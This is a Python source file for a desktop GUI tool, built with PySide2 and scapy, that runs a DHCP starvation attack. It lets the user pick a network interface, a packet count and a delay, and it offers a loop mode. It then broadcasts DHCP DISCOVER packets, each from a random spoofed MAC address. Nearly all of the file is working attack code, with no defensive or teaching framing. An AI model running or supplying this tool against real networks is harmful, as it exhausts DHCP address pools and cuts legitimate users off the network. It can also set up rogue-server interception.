import psutil
from scapy.all import *
import binascii
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from PySide2.QtWidgets import QApplication, QMessageBox
from PySide2.QtUiTools import QUiLoader
import _thread
import datetime
import time

class PubDATA:
    mainWin = None

class Win_Main:
    def __init__(self):

        self.LOCK = False
        self.LOOP_STOP_MODE = False
        self.ui = QUiLoader().load('Main.ui')
        self.NetWork_INFO=self.Get_IterFace()
        self.ui.Attack_start.clicked.connect(lambda:self.Check_Data(False))
        self.ui.Loop_Attack.clicked.connect(lambda:self.Check_Data(True))
        self.ui.STOP.clicked.connect(self.STOP_MODE)
        self.ui.Clean.clicked.connect(self.Clear_winow_Attack)
        self.ui.Delay.setText("1000")
        self.ui.Lock.setText(self.NetWork_INFO[0][0])


    def Clear_winow_Attack(self):
        self.ui.Attack_View.clear()
    def STOP_MODE(self):
        self.LOOP_STOP_MODE=True
        self.Error("Stop Success!!")
    def Error(self,Message):
        QMessageBox.warning(self.ui, "warning!",Message )

    def Get_IterFace(self):
        DATA=[]
        network_interface = psutil.net_if_addrs()
        for k,v in network_interface.items():
            for item in v:
                if item[0] == 2 and not item[1]=='127.0.0.1':
                    self.ui.iface.append(str(k)+'-->'+str(item[1]))
                    DATA.append((k,item[1]))
        return DATA
    def Check_Data(self,MODE):
        if self.LOCK == False:
            self.iterface_Lock = str(self.ui.Lock.text())
            self.Attack_Number = str(self.ui.Attack_number.text())
            self.Attack_Time = str(self.ui.Delay.text())

            if self.Attack_Number.isdigit() and int(self.Attack_Number)<= 255 and len(self.iterface_Lock) < 20 and self.iterface_Lock and self.Attack_Time.isdigit() and int(self.Attack_Time) <=10000:
                self.LOCK = True
                self.Attack_Number=int(self.Attack_Number)
                self.Attack_Time=int(self.Attack_Time)/1000
                #print(self.iterface_Lock,self.Attack_Number)
                _thread.start_new_thread(self.Attack, (MODE,))
            else:
                self.Error("!!!Find a Error!!!")
                self.iterface_Lock=None
                self.Attack_Number=None
                return 0


        else:
            self.Error("Runing")
    def Probe(self):

        pass
    def Attack(self,MODE):
        if MODE :
            self.Attack_Number=99999

        self.ui.Attack_View.append(f"---{datetime.datetime.now()}----\nUse {self.iterface_Lock} Attacking... Number-->{self.Attack_Number}  ..Time{self.Attack_Time*self.Attack_Number}s..")
        for i in range(0, int(self.Attack_Number)):
            if self.LOOP_STOP_MODE==False:

                xid_random = random.randint(1, 90000000)
                mac_random = str(RandMAC())
                clien_mac_id = binascii.unhexlify(mac_random.replace(":", ''))
                #self.ui.Attack_View.append(f"{mac_random} From {self.iterface_Lock} Attacking...")
                dhcp_discover = Ether(src=mac_random, dst="FF:FF:FF:FF:FF:FF") / IP(src="0.0.0.0",dst="255.255.255.255") / \
                    UDP(sport=68,dport=67) / BOOTP(chaddr=clien_mac_id, xid=xid_random) / DHCP(options=[("message-type", "discover"), "end"])
                sendp(dhcp_discover, iface=str(self.iterface_Lock))
                time.sleep(int(self.Attack_Time))
                #self.ui.Attack_View.append("^^^^"+str(datetime.datetime.now()))

            else:
                break
        self.ui.Attack_View.append(f"Use {self.iterface_Lock} Dhcp Attack------[Done]")
        self.LOOP_STOP_MODE = False
        self.LOCK = False

def main():
    app = QApplication([])
    PubDATA.mainWin = Win_Main()
    PubDATA.mainWin.ui.show()
    app.exec_()


if __name__ == '__main__':
    main()






